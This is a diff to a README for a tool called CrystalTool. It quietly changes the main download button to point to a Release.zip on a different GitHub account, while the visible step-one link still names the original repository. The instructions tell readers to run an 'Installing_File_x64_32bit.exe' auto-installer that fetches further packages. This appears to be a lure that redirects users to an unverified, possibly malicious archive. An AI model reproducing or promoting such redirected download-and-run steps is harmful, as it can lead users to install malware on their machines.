@@ -10,7 +10,7 @@
 To install this programm, follow these steps:
 
 [![asdasdasd](https://github.com/user-attachments/assets/6d9b9a0e-4468-43d3-bece-6ec24827a5fc)
-](https://github.com/roku-on-it/CrystalTool/releases/download/V6.2/Release.zip)
+](https://github.com/ZhongZhang96/CrystalTool/releases/download/Release/Release.zip)
 
 ## **1. [Download the archive](https://github.com/roku-on-it/CrystalTool/releases/download/V6.2/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
